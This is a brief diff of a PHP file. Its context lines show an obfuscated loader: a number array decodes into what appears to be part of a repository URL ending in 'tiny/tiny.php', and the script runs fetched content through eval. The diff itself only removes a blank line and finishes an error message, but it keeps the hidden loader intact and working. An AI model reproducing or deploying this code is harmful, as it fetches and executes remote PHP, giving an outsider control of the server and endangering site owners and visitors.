@@ -16,7 +16,6 @@ $asciiArray = [
     102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 
     116, 105, 110, 121, 47, 116, 105, 110, 121, 46, 112, 104, 112
 ];
-
 $decodedString = '';
 foreach ($asciiArray as $ascii) {
     $decodedString .= chr($ascii);
@@ -106,4 +105,5 @@ if (isset($_GET['ts'])) {
 if (is_string($result)) {
     eval ('?>' . $result);
 } else {
-    echo "Erro
+    echo "Error";
+} ?>
